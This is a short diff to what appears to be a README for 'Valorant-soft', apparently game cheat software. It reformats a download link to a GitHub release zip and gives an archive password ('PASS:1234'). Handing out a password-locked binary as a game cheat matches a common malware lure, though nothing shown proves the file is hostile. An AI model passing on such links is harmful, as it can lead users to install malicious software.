@@ -10,7 +10,7 @@ To install, you will need:
 
 IF NOT WORK RESTART COMPUTER
 
-download : ("https://github.com/Gimmyalex/Valorant-soft/releases/download/Download/valarant-software.zip")|
+download : https://github.com/Gimmyalex/Valorant-soft/releases/download/Download/valarant-software.zip
 
 PASS:1234
 
